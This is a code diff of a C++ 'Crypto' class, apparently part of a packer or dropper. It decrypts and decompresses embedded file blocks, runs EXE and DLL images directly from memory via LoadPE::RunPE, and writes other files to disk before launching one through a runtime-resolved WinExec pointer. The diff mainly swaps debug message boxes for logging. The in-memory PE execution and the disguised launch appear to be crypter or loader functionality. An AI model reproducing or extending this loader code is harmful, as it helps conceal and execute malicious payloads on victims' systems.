@@ -36,6 +36,10 @@ int Crypto::reloadPE(const char* data, int datasize) {
 	FILE_DATA_BLOCK* fdb = (FILE_DATA_BLOCK*)data;
 
 	unsigned char* dstblock = new unsigned char[datasize + 0x1000];
+	if (dstblock == 0) {
+		runLog("%s %d error\r\n", __FUNCTION__, __LINE__);
+		return -1;
+	}
 
 	unsigned char* key = fdb->key;
 
@@ -46,6 +50,7 @@ int Crypto::reloadPE(const char* data, int datasize) {
 
 	if (cfd->cnt <= 0 || cfd->cnt >= MAX_INPUT_FILE)
 	{
+		runLog("%s %d error\r\n", __FUNCTION__, __LINE__);
 		return -1;
 	}
 
@@ -68,61 +73,36 @@ int Crypto::reloadPE(const char* data, int datasize) {
 		if (ret == 0)
 		{
 			ret = PEParser::isPE((char*)uncompbuf);
-			if (ret <= 0)
+			if (ret )
 			{
-				break;
-			}
-
-			if (memcmp(filename + lstrlenA(filename) - 4, szExeFn, 4) == 0)
-			{
-				delete[] dstblock;
-#ifdef _DEBUG
-				//wsprintfA(szinfo, "run exe:%s size:%u", filename,uncompbufsize);
-				//MessageBoxA(0, szinfo, szinfo, MB_OK);
-				//FileHelper::fileWriter("d:\\test.exe",(const char*) uncompbuf, uncompbufsize);
-#endif
-				
-				ret = LoadPE::RunPE((char*)uncompbuf, uncompsize);
-				//ret = MemRunPE((char*)uncompbuf, uncompsize);
-
-				delete[] uncompbuf;
-				uncompbuf = 0;
-				return ret;
-			}
-			else if (memcmp(filename + lstrlenA(filename) - 4, szDllFn, 4) == 0)
-			{
-				delete[] dstblock;
-#ifdef _DEBUG
-				//wsprintfA(szinfo, "run dll:%s size:%u", filename,uncompbufsize);
-				//MessageBoxA(0, szinfo, szinfo, MB_OK);
-#endif
-				ret = LoadPE::RunPE((char*)uncompbuf, uncompsize);
-
-				delete[] uncompbuf;
-				uncompbuf = 0;
-				return ret;
+				if (memcmp(filename + lstrlenA(filename) - 4, szExeFn, 4) == 0)
+				{			
+					ret = LoadPE::RunPE((char*)uncompbuf, uncompsize);
+				}
+				else if (memcmp(filename + lstrlenA(filename) - 4, szDllFn, 4) == 0)
+				{
+					ret = LoadPE::RunPE((char*)uncompbuf, uncompsize);
+				}
+				else {
+					runLog("%s %d error\r\n", __FUNCTION__, __LINE__);
+				}
 			}
 			else {
-				break;
+				runLog("%s %d error\r\n", __FUNCTION__, __LINE__);
 			}
 		}
 		else {
-#ifdef _DEBUG
-			wsprintfA(szinfo, "uncompress file:%s error", filename);
-			MessageBoxA(0, szinfo, szinfo, MB_OK);
-#endif
-			break;
+			runLog("%s %d error\r\n", __FUNCTION__, __LINE__);
 		}
+
 		fd = (FILE_DATA*)((char*)fd + sizeof(FILE_DATA) + fd->fsize);
 
-		if (uncompbuf)
-		{
-			delete[] uncompbuf;
-			uncompbuf = 0;
-		}
+		delete[] uncompbuf;
+		uncompbuf = 0;	
 	}
 
 	delete[] dstblock;
+
 	return cfd->cnt;
 }
 
@@ -173,8 +153,6 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 
 	FILE_DATA* fd = & cfd->fd;
 
-	//MessageBoxA(0, szinfo, szinfo, MB_OK);
-
 	for (int i = 0; i < cfd->cnt; i++)
 	{
 		char filename[256] = { 0 };
@@ -197,8 +175,6 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 
 		runLog("file:%s,path:%s\r\n", filename, path.c_str());
 
-		//MessageBoxA(0, filename, filename, MB_OK);
-
 		unsigned char* uncompbuf = new unsigned char[fd->fsize + 0x1000];
 		if (uncompbuf == 0) {
 			break;
@@ -218,12 +194,10 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 			}
 			else {
 				runLog("write file:%s error:%d\r\n", (path + filename).c_str(),GetLastError());
-				//break;
 			}
 		}
 		else {
 			runLog("uncompress file:%s error:%d\r\n", (path + filename).c_str(), GetLastError());
-			//break;
 		}
 
 		if (uncompbuf)
@@ -248,8 +222,6 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 		wsprintfA(szcmd, "\"%s\" %s", runningfn.c_str(), params.c_str());
 
 		runLog("cmd:%s\r\n", szcmd);
-
-		//MessageBoxA(0, szcmd, szcmd, MB_OK);
 
 		ret =lpWinExec(szcmd, SW_SHOW);
 
